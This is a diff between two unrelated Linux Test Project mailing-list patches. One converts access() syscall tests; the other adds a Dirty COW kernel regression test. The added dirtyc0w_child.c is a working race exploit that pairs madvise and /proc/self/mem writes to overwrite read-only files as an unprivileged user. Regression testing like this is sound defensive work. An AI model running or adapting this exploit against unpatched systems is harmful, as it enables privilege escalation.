@@ -1,199 +1,135 @@
-From: Guangwen Feng <fenggw-fnst@cn.fujitsu.com>
-Date: Tue, 1 Nov 2016 17:18:02 +0800
-Subject: [LTP] [PATCH] syscalls/access04: Convert to new API && Rename
-Message-ID: <1477991882-23372-1-git-send-email-fenggw-fnst@cn.fujitsu.com>
+From: Cyril Hrubis <chrubis@suse.cz>
+Date: Tue, 1 Nov 2016 10:25:42 +0100
+Subject: [LTP] [COMMITTED] [PATCH 2/2] security/dirtyc0w: Add new test.
+Message-ID: <20161101092542.GA18331@rei.lan>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: ltp@lists.linux.it
 
-Convert access06 to new API and add it to access05,
-then rename the new access05 to access04.
+Based on: https://github.com/dirtycow/dirtycow.github.io
 
-Signed-off-by: Guangwen Feng <fenggw-fnst@cn.fujitsu.com>
+Signed-off-by: Cyril Hrubis <chrubis@suse.cz>
 ---
- runtest/ltplite                             |   3 +-
- runtest/stress.part3                        |   3 +-
- runtest/syscalls                            |   3 +-
- testcases/kernel/syscalls/.gitignore        |   3 +-
- testcases/kernel/syscalls/access/access04.c | 150 ++++++++++++++++++++++++++++
- testcases/kernel/syscalls/access/access05.c | 126 -----------------------
- testcases/kernel/syscalls/access/access06.c | 148 ---------------------------
- 7 files changed, 154 insertions(+), 282 deletions(-)
- create mode 100644 testcases/kernel/syscalls/access/access04.c
- delete mode 100644 testcases/kernel/syscalls/access/access05.c
- delete mode 100644 testcases/kernel/syscalls/access/access06.c
+ runtest/syscalls                                   |   1 +
+ testcases/kernel/security/dirtyc0w/.gitignore      |   2 +
+ testcases/kernel/security/dirtyc0w/Makefile        |  21 ++++
+ testcases/kernel/security/dirtyc0w/dirtyc0w.c      | 112 +++++++++++++++++++
+ .../kernel/security/dirtyc0w/dirtyc0w_child.c      | 121 +++++++++++++++++++++
+ 5 files changed, 257 insertions(+)
+ create mode 100644 testcases/kernel/security/dirtyc0w/.gitignore
+ create mode 100644 testcases/kernel/security/dirtyc0w/Makefile
+ create mode 100644 testcases/kernel/security/dirtyc0w/dirtyc0w.c
+ create mode 100644 testcases/kernel/security/dirtyc0w/dirtyc0w_child.c
 
-diff --git a/runtest/ltplite b/runtest/ltplite
-index 338d6eb..00ea00a 100644
---- a/runtest/ltplite
-+++ b/runtest/ltplite
-@@ -64,8 +64,7 @@ accept01 accept01
- access01 access01
- access02 access02
- access03 access03
--access05 access05
--access06 access06
-+access04 access04
- 
- acct01 acct01
- 
-diff --git a/runtest/stress.part3 b/runtest/stress.part3
-index 8abed95..210b9c4 100644
---- a/runtest/stress.part3
-+++ b/runtest/stress.part3
-@@ -6,8 +6,7 @@ accept01 accept01
- access01 access01
- access02 access02
- access03 access03
--access05 access05
--access06 access06
-+access04 access04
- 
- acct01 acct01
- 
 diff --git a/runtest/syscalls b/runtest/syscalls
-index b781241..867a7b3 100644
+index b781241..7c84296 100644
 --- a/runtest/syscalls
 +++ b/runtest/syscalls
-@@ -7,8 +7,7 @@ accept4_01 accept4_01
- access01 access01
- access02 access02
- access03 access03
--access05 access05
--access06 access06
-+access04 access04
+@@ -804,6 +804,7 @@ process_vm_writev01 process_vm01 -w
+ process_vm_writev02 process_vm_writev02
  
- acct01 acct01
+ prot_hsymlinks prot_hsymlinks
++dirtyc0w dirtyc0w
  
-diff --git a/testcases/kernel/syscalls/.gitignore b/testcases/kernel/syscalls/.gitignore
-index f53cc05..60d2f44 100644
---- a/testcases/kernel/syscalls/.gitignore
-+++ b/testcases/kernel/syscalls/.gitignore
-@@ -4,8 +4,7 @@
- /access/access01
- /access/access02
- /access/access03
--/access/access05
--/access/access06
-+/access/access04
- /acct/acct01
- /add_key/add_key01
- /add_key/add_key02
-diff --git a/testcases/kernel/syscalls/access/access04.c b/testcases/kernel/syscalls/access/access04.c
+ pselect01 pselect01
+ pselect01_64 pselect01_64
+diff --git a/testcases/kernel/security/dirtyc0w/.gitignore b/testcases/kernel/security/dirtyc0w/.gitignore
 new file mode 100644
-index 0000000..3bcafee
+index 0000000..7700d91
 --- /dev/null
-+++ b/testcases/kernel/syscalls/access/access04.c
-@@ -0,0 +1,150 @@
++++ b/testcases/kernel/security/dirtyc0w/.gitignore
+@@ -0,0 +1,2 @@
++dirtyc0w
++dirtyc0w_child
+diff --git a/testcases/kernel/security/dirtyc0w/Makefile b/testcases/kernel/security/dirtyc0w/Makefile
+new file mode 100644
+index 0000000..aef8a9a
+--- /dev/null
++++ b/testcases/kernel/security/dirtyc0w/Makefile
+@@ -0,0 +1,21 @@
++# Copyright (c) 2016 Linux Test Project
++#
++# This program is free software; you can redistribute it and/or
++# modify it under the terms of the GNU General Public License as
++# published by the Free Software Foundation; either version 2 of
++# the License, or (at your option) any later version.
++#
++# This program is distributed in the hope that it would be useful,
++# but WITHOUT ANY WARRANTY; without even the implied warranty of
++# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
++# GNU General Public License for more details.
++#
++# You should have received a copy of the GNU General Public License
++# along with this program; if not, write the Free Software Foundation,
++# Inc.,  51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
++
++top_srcdir		?= ../../../..
++
++include $(top_srcdir)/include/mk/testcases.mk
++dirtyc0w_child: CFLAGS+=-pthread
++include $(top_srcdir)/include/mk/generic_leaf_target.mk
+diff --git a/testcases/kernel/security/dirtyc0w/dirtyc0w.c b/testcases/kernel/security/dirtyc0w/dirtyc0w.c
+new file mode 100644
+index 0000000..fdf5d24
+--- /dev/null
++++ b/testcases/kernel/security/dirtyc0w/dirtyc0w.c
+@@ -0,0 +1,112 @@
 +/*
-+ *   Copyright (c) International Business Machines  Corp., 2001
-+ *   Copyright (c) 2013 Fujitsu Ltd.
++ * Copyright (c) 2016 Cyril Hrubis <chrubis@suse.cz>
 + *
-+ *   This program is free software;  you can redistribute it and/or modify
-+ *   it under the terms of the GNU General Public License as published by
-+ *   the Free Software Foundation; either version 2 of the License, or
-+ *   (at your option) any later version.
++ * This program is free software: you can redistribute it and/or modify
++ * it under the terms of the GNU General Public License as published by
++ * the Free Software Foundation, either version 2 of the License, or
++ * (at your option) any later version.
 + *
-+ *   This program is distributed in the hope that it will be useful,
-+ *   but WITHOUT ANY WARRANTY;  without even the implied warranty of
-+ *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See
-+ *   the GNU General Public License for more details.
++ * This program is distributed in the hope that it will be useful,
++ * but WITHOUT ANY WARRANTY; without even the implied warranty of
++ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
++ * GNU General Public License for more details.
 + *
-+ *   You should have received a copy of the GNU General Public License
-+ *   along with this program;  if not, write to the Free Software
-+ *   Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
++ * You should have received a copy of the GNU General Public License
++ * along with this program. If not, see <http://www.gnu.org/licenses/>.
 + */
 +
 +/*
-+ * Test Description:
-+ *  Verify that,
-+ *   1. access() fails with -1 return value and sets errno to EINVAL
-+ *	if the specified access mode argument is invalid.
-+ *   2. access() fails with -1 return value and sets errno to ENOENT
-+ *	if the specified file doesn't exist (or pathname is NULL).
-+ *   3. access() fails with -1 return value and sets errno to ENAMETOOLONG
-+ *      if the pathname size is > PATH_MAX characters.
-+ *   4. access() fails with -1 return value and sets errno to ENOTDIR
-+ *      if a component used as a directory in pathname is not a directory.
-+ *   5. access() fails with -1 return value and sets errno to ELOOP
-+ *      if too many symbolic links were encountered in resolving pathname.
-+ *   6. access() fails with -1 return value and sets errno to EROFS
-+ *      if write permission was requested for files on a read-only file system.
++ * This is a regression test for write race that allows unprivileged programs
++ * to change readonly files on the system.
 + *
-+ *   07/2001 Ported by Wayne Boyer
-+ *   11/2013 Ported by Xiaoguang Wang <wangxg.fnst@cn.fujitsu.com>
-+ *   11/2016 Modified by Guangwen Feng <fenggw-fnst@cn.fujitsu.com>
++ * It has been fixed long time ago:
++ *
++ *   commit 4ceb5db9757aaeadcf8fbbf97d76bd42aa4df0d6
++ *   Author: Linus Torvalds <torvalds@g5.osdl.org>
++ *   Date:   Mon Aug 1 11:14:49 2005 -0700
++ *
++ *   Fix get_user_pages() race for write access
++ *
++ * Then it reappeared and was fixed again in:
++ *
++ *   commit 19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619
++ *   Author: Linus Torvalds <torvalds@linux-foundation.org>
++ *   Date:   Thu Oct 13 20:07:36 2016 GMT
++ *
++ *   mm: remove gup_flags FOLL_WRITE games from __get_user_pages()
 + */
 +
-+#include <errno.h>
-+#include <pwd.h>
-+#include <string.h>
-+#include <sys/mount.h>
-+#include <sys/types.h>
++#include <sys/mman.h>
++#include <fcntl.h>
++#include <pthread.h>
 +#include <unistd.h>
++#include <sys/stat.h>
++#include <string.h>
++#include <stdlib.h>
++#include <pwd.h>
 +
 +#include "tst_test.h"
 +
-+#define FNAME1	"accessfile1"
-+#define FNAME2	"accessfile2/accessfile2"
-+#define DNAME	"accessfile2"
-+#define SNAME1	"symlink1"
-+#define SNAME2	"symlink2"
-+#define MNT_POINT	"mntpoint"
++#define FNAME "test"
++#define STR   "this is not a test\n"
 +
-+static uid_t uid;
-+static char longpathname[PATH_MAX + 2];
-+int mount_flag;
-+
-+static struct tcase {
-+	const char *pathname;
-+	int mode;
-+	int exp_errno;
-+} tcases[] = {
-+	{FNAME1, -1, EINVAL},
-+	{"", W_OK, ENOENT},
-+	{longpathname, R_OK, ENAMETOOLONG},
-+	{FNAME2, R_OK, ENOTDIR},
-+	{SNAME1, R_OK, ELOOP},
-+	{MNT_POINT, W_OK, EROFS}
-+};
-+
-+static void access_test(struct tcase *tc, const char *user)
-+{
-+	TEST(access(tc->pathname, tc->mode));
-+
-+	if (TEST_RETURN != -1) {
-+		tst_res(TFAIL, "access as %s succeeded unexpectedly", user);
-+		return;
-+	}
-+
-+	if (TEST_ERRNO != tc->exp_errno) {
-+		tst_res(TFAIL | TTERRNO,
-+			"access as %s should fail with %s",
-+			user, tst_strerrno(tc->exp_errno));
-+		return;
-+	}
-+
-+	tst_res(TPASS | TTERRNO, "access as %s failed expectedly", user);
-+}
-+
-+static void verify_access(unsigned int n)
-+{
-+	struct tcase *tc = tcases + n;
-+	pid_t pid;
-+
-+	access_test(tc, "root");
-+
-+	pid = SAFE_FORK();
-+	if (pid) {
-+		SAFE_WAITPID(pid, NULL, 0);
-+	} else {
-+		SAFE_SETUID(uid);
-+		access_test(tc, "nobody");
-+	}
-+}
++static uid_t nobody_uid;
++static gid_t nobody_gid;
 +
 +static void setup(void)
 +{
@@ -201,330 +137,188 @@ index 0000000..3bcafee
 +
 +	pw = SAFE_GETPWNAM("nobody");
 +
-+	uid = pw->pw_uid;
-+
-+	memset(longpathname, 'a', sizeof(longpathname) - 1);
-+
-+	SAFE_TOUCH(FNAME1, 0333, NULL);
-+	SAFE_TOUCH(DNAME, 0644, NULL);
-+
-+	SAFE_SYMLINK(SNAME1, SNAME2);
-+	SAFE_SYMLINK(SNAME2, SNAME1);
-+
-+	SAFE_MKFS(tst_device->dev, tst_device->fs_type, NULL, NULL);
-+	SAFE_MKDIR(MNT_POINT, 0755);
-+	SAFE_MOUNT(tst_device->dev, MNT_POINT, tst_device->fs_type,
-+		MS_RDONLY, NULL);
-+	mount_flag = 1;
++	nobody_uid = pw->pw_uid;
++	nobody_gid = pw->pw_gid;
 +}
 +
-+static void cleanup(void)
++void dirtyc0w_test(void)
 +{
-+	if (mount_flag && tst_umount(MNT_POINT) < 0) {
-+		tst_brk(TBROK | TERRNO, "umount device:%s failed",
-+			tst_device->dev);
++	int i, fd, pid, fail = 0;
++	char c;
++
++	/* Create file */
++	fd = SAFE_OPEN(FNAME, O_WRONLY|O_CREAT|O_EXCL, 0444);
++	SAFE_WRITE(1, fd, STR, sizeof(STR)-1);
++	SAFE_CLOSE(fd);
++
++	pid = SAFE_FORK();
++
++	if (!pid) {
++		SAFE_SETGID(nobody_gid);
++		SAFE_SETUID(nobody_uid);
++		SAFE_EXECLP("dirtyc0w_child", "dirtyc0w_child", NULL);
 +	}
++
++	for (i = 0; i < 100; i++)  {
++		usleep(10000);
++
++		SAFE_FILE_SCANF(FNAME, "%c", &c);
++
++		if (c != 't') {
++			fail = 1;
++			break;
++		}
++	}
++
++	SAFE_KILL(pid, SIGUSR1);
++	tst_reap_children();
++	SAFE_UNLINK(FNAME);
++
++	if (fail)
++		tst_res(TFAIL, "Bug reproduced!");
++	else
++		tst_res(TPASS, "Bug not reproduced");
 +}
 +
 +static struct tst_test test = {
-+	.tid = "access05",
-+	.test = verify_access,
++	.tid = "dirtyc0w",
 +	.needs_tmpdir = 1,
-+	.needs_root = 1,
-+	.needs_device = 1,
 +	.forks_child = 1,
++	.needs_root = 1,
 +	.setup = setup,
-+	.cleanup = cleanup,
-+	.tcnt = ARRAY_SIZE(tcases)
++	.test_all = dirtyc0w_test,
 +};
-diff --git a/testcases/kernel/syscalls/access/access05.c b/testcases/kernel/syscalls/access/access05.c
-deleted file mode 100644
-index 8f2cf8d..0000000
---- a/testcases/kernel/syscalls/access/access05.c
-+++ /dev/null
-@@ -1,126 +0,0 @@
--/*
-- *
-- *   Copyright (c) International Business Machines  Corp., 2001
-- *
-- *   This program is free software;  you can redistribute it and/or modify
-- *   it under the terms of the GNU General Public License as published by
-- *   the Free Software Foundation; either version 2 of the License, or
-- *   (at your option) any later version.
-- *
-- *   This program is distributed in the hope that it will be useful,
-- *   but WITHOUT ANY WARRANTY;  without even the implied warranty of
-- *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See
-- *   the GNU General Public License for more details.
-- *
-- *   You should have received a copy of the GNU General Public License
-- *   along with this program;  if not, write to the Free Software
-- *   Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA
-- */
--
--/*
-- * Test Description:
-- *  Verify that,
-- *   1. access() fails with -1 return value and sets errno to EINVAL
-- *	if the specified access mode argument is invalid.
-- *   2. access() fails with -1 return value and sets errno to ENOENT
-- *	if the specified file doesn't exist (or pathname is NULL).
-- *   3. access() fails with -1 return value and sets errno to ENAMETOOLONG
-- *      if the pathname size is > PATH_MAX characters.
-- *   4. access() fails with -1 return value and sets errno to ENOTDIR
-- *      if a component used as a directory in pathname is not a directory.
-- *   5. access() fails with -1 return value and sets errno to ELOOP
-- *      if too many symbolic links were encountered in resolving pathname.
-- *
-- *   07/2001 Ported by Wayne Boyer
-- *   07/2016 Modified by Guangwen Feng <fenggw-fnst@cn.fujitsu.com>
-- */
--
--#include <errno.h>
--#include <pwd.h>
--#include <string.h>
--#include <sys/types.h>
--#include <unistd.h>
--#include "tst_test.h"
--
--#define FNAME1	"accessfile1"
--#define FNAME2	"accessfile2/accessfile2"
--#define DNAME	"accessfile2"
--#define SNAME1	"symlink1"
--#define SNAME2	"symlink2"
--
--static uid_t uid;
--static char longpathname[PATH_MAX + 2];
--
--static struct tcase {
--	const char *pathname;
--	int mode;
--	int exp_errno;
--} tcases[] = {
--	{FNAME1, -1, EINVAL},
--	{"", W_OK, ENOENT},
--	{longpathname, R_OK, ENAMETOOLONG},
--	{FNAME2, R_OK, ENOTDIR},
--	{SNAME1, R_OK, ELOOP}
--};
--
--static void access_test(struct tcase *tc, const char *user)
--{
--	TEST(access(tc->pathname, tc->mode));
--
--	if (TEST_RETURN != -1) {
--		tst_res(TFAIL, "access as %s succeeded unexpectedly", user);
--		return;
--	}
--
--	if (TEST_ERRNO != tc->exp_errno) {
--		tst_res(TFAIL | TTERRNO,
--			"access as %s should fail with %s",
--			user, tst_strerrno(tc->exp_errno));
--		return;
--	}
--
--	tst_res(TPASS | TTERRNO, "access as %s failed expectedly", user);
--}
--
--static void verify_access(unsigned int n)
--{
--	struct tcase *tc = tcases + n;
--	pid_t pid;
--
--	access_test(tc, "root");
--
--	pid = SAFE_FORK();
--	if (pid) {
--		SAFE_WAITPID(pid, NULL, 0);
--	} else {
--		SAFE_SETUID(uid);
--		access_test(tc, "nobody");
--	}
--}
--
--static void setup(void)
--{
--	struct passwd *pw;
--
--	pw = SAFE_GETPWNAM("nobody");
--
--	uid = pw->pw_uid;
--
--	memset(longpathname, 'a', sizeof(longpathname) - 1);
--
--	SAFE_TOUCH(FNAME1, 0333, NULL);
--	SAFE_TOUCH(DNAME, 0644, NULL);
--
--	SAFE_SYMLINK(SNAME1, SNAME2);
--	SAFE_SYMLINK(SNAME2, SNAME1);
--}
--
--static struct tst_test test = {
--	.tid = "access05",
--	.needs_tmpdir = 1,
--	.needs_root = 1,
--	.forks_child = 1,
--	.setup = setup,
--	.test = verify_access,
--	.tcnt = ARRAY_SIZE(tcases)
--};
-diff --git a/testcases/kernel/syscalls/access/access06.c b/testcases/kernel/syscalls/access/access06.c
-deleted file mode 100644
-index e9372f8..0000000
---- a/testcases/kernel/syscalls/access/access06.c
-+++ /dev/null
-@@ -1,148 +0,0 @@
--/*
-- * Copyright (c) 2013 Fujitsu Ltd.
-- * Author: Xiaoguang Wang <wangxg.fnst@cn.fujitsu.com>
-- *
-- * This program is free software; you can redistribute it and/or modify it
-- * under the terms of version 2 of the GNU General Public License as
-- * published by the Free Software Foundation.
-- *
-- * This program is distributed in the hope that it would be useful, but
-- * WITHOUT ANY WARRANTY; without even the implied warranty of
-- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
-- *
-- * You should have received a copy of the GNU General Public License along
-- * with this program; if not, write the Free Software Foundation, Inc.,
-- * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
-- */
--
--/*
-- * Description:
-- * Verify that,
-- *  1. access() fails with -1 return value and sets errno to EROFS
-- *     if write permission was requested for files on a read-only file system.
-- */
--
--#include <stdio.h>
--#include <errno.h>
--#include <unistd.h>
--#include <fcntl.h>
--#include <string.h>
--#include <signal.h>
--#include <sys/types.h>
--#include <sys/stat.h>
--#include <sys/mman.h>
--#include <sys/mount.h>
--#include <pwd.h>
--
--#include "test.h"
--#include "safe_macros.h"
--
--static void setup(void);
--static void access_verify(int i);
--static void cleanup(void);
--
--#define DIR_MODE	(S_IRUSR|S_IWUSR|S_IXUSR|S_IRGRP| \
--			 S_IXGRP|S_IROTH|S_IXOTH)
--#define MNT_POINT	"mntpoint"
--
--static const char *device;
--static const char *fs_type;
--static int mount_flag;
--
--static struct test_case_t {
--	char *pathname;
--	int a_mode;
--	int exp_errno;
--} test_cases[] = {
--	{MNT_POINT, W_OK, EROFS}
--};
--
--char *TCID = "access06";
--int TST_TOTAL = ARRAY_SIZE(test_cases);
--
--int main(int ac, char **av)
--{
--	int lc;
--	int i;
--
--	tst_parse_opts(ac, av, NULL, NULL);
--
--	setup();
--
--	for (lc = 0; TEST_LOOPING(lc); lc++) {
--		tst_count = 0;
--
--		for (i = 0; i < TST_TOTAL; i++)
--			access_verify(i);
--	}
--
--	cleanup();
--	tst_exit();
--}
--
--static void setup(void)
--{
--	tst_sig(NOFORK, DEF_HANDLER, cleanup);
--
--	tst_require_root();
--	tst_tmpdir();
--
--	fs_type = tst_dev_fs_type();
--	device = tst_acquire_device(cleanup);
--
--	if (!device)
--		tst_brkm(TCONF, cleanup, "Failed to obtain block device");
--
--	tst_mkfs(cleanup, device, fs_type, NULL, NULL);
--	SAFE_MKDIR(cleanup, MNT_POINT, DIR_MODE);
--
--	TEST_PAUSE;
--
--	/*
--	 * mount a read-only file system for test EROFS
--	 */
--	if (mount(device, MNT_POINT, fs_type, MS_RDONLY, NULL) < 0) {
--		tst_brkm(TBROK | TERRNO, cleanup,
--			 "mount device:%s failed", device);
--	}
--	mount_flag = 1;
--}
--
--static void access_verify(int i)
--{
--	char *file_name;
--	int access_mode;
--
--	file_name = test_cases[i].pathname;
--	access_mode = test_cases[i].a_mode;
--
--	TEST(access(file_name, access_mode));
--
--	if (TEST_RETURN != -1) {
--		tst_resm(TFAIL, "access(%s, %#o) succeeded unexpectedly",
--			 file_name, access_mode);
--		return;
--	}
--
--	if (TEST_ERRNO == test_cases[i].exp_errno) {
--		tst_resm(TPASS | TTERRNO, "access failed as expected");
--	} else {
--		tst_resm(TFAIL | TTERRNO,
--			 "access failed unexpectedly; expected: "
--			 "%d - %s", test_cases[i].exp_errno,
--			 strerror(test_cases[i].exp_errno));
--	}
--}
--
--static void cleanup(void)
--{
--	if (mount_flag && tst_umount(MNT_POINT) < 0) {
--		tst_resm(TWARN | TERRNO,
--			 "umount device:%s failed", device);
--	}
--
--	if (device)
--		tst_release_device(device);
--
--	tst_rmdir();
--}
+diff --git a/testcases/kernel/security/dirtyc0w/dirtyc0w_child.c b/testcases/kernel/security/dirtyc0w/dirtyc0w_child.c
+new file mode 100644
+index 0000000..159716c
+--- /dev/null
++++ b/testcases/kernel/security/dirtyc0w/dirtyc0w_child.c
+@@ -0,0 +1,121 @@
++/*
++ * Copyright (c) 2016 Cyril Hrubis <chrubis@suse.cz>
++ *  Based on: https://github.com/dirtycow/dirtycow.github.io
++ *
++ * This program is free software: you can redistribute it and/or modify
++ * it under the terms of the GNU General Public License as published by
++ * the Free Software Foundation, either version 2 of the License, or
++ * (at your option) any later version.
++ *
++ * This program is distributed in the hope that it will be useful,
++ * but WITHOUT ANY WARRANTY; without even the implied warranty of
++ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
++ * GNU General Public License for more details.
++ *
++ * You should have received a copy of the GNU General Public License
++ * along with this program. If not, see <http://www.gnu.org/licenses/>.
++ */
++
++#include <sys/mman.h>
++#include <fcntl.h>
++#include <pthread.h>
++#include <unistd.h>
++#include <sys/stat.h>
++#include <string.h>
++#include <stdlib.h>
++#include <pwd.h>
++
++#define TST_NO_DEFAULT_MAIN
++#include "tst_test.h"
++
++#define FNAME "test"
++#define STR   "this is not a test\n"
++
++static char *str = "m00000000000000000";
++static void *map;
++static int mfd;
++
++/*
++ * You have to race madvise(MADV_DONTNEED) ::
++ * https://access.redhat.com/security/vulnerabilities/2706661
++ *
++ * This is achieved by racing the madvise(MADV_DONTNEED) system call while
++ * having the page of the executable mmapped in memory.
++ */
++static void *madvise_thread(void *arg)
++{
++	int c = 0;
++
++	(void)arg;
++
++	while (1)
++		c += madvise(map, 100, MADV_DONTNEED);
++
++	tst_res(TINFO, "madvise: %i", c);
++
++	return NULL;
++}
++
++/*
++ * You have to write to /proc/self/mem ::
++ * https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
++ *
++ * The in the wild exploit we are aware of doesn't work on Red Hat Enterprise
++ * Linux 5 and 6 out of the box because on one side of the race it writes to
++ * /proc/self/mem, but /proc/self/mem is not writable on Red Hat Enterprise
++ * Linux 5 and 6.
++ */
++void *proc_self_mem_thread(void *arg)
++{
++	int c = 0;
++
++	(void)arg;
++
++	while (1) {
++		lseek(mfd, (uintptr_t) map, SEEK_SET);
++		c += write(mfd, str, strlen(str));
++	}
++
++	tst_res(TINFO, "write: %i", c);
++
++	return NULL;
++}
++
++void sighandler(int sig)
++{
++	(void) sig;
++
++	_exit(0);
++}
++
++/*
++ * You have to use MAP_PRIVATE for copy-on-write mapping.
++ * Create a private copy-on-write mapping. Updates to the
++ * mapping are not visible to other processes mapping the same
++ * file, and are not carried through to the underlying file. It
++ * is unspecified whether changes made to the file after the
++ * mmap() call are visible in the mapped region.
++ */
++int main(void)
++{
++	pthread_t pth1, pth2;
++	int fd;
++	struct stat st;
++
++	SAFE_SIGNAL(SIGUSR1, sighandler);
++
++	/* Open it read only and map */
++	fd = SAFE_OPEN(FNAME, O_RDONLY);
++	SAFE_FSTAT(fd, &st);
++
++	map = SAFE_MMAP(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
++	mfd = SAFE_OPEN("/proc/self/mem", O_RDWR);
++
++	/* Try to rewrite it */
++	SAFE_PTHREAD_CREATE(&pth1, NULL, madvise_thread, NULL);
++	SAFE_PTHREAD_CREATE(&pth2, NULL, proc_self_mem_thread, NULL);
++
++	pause();
++
++	return 0;
++}
 -- 
-1.8.4.2
+2.7.3
 
 
-
+-- 
+Cyril Hrubis
+chrubis@suse.cz
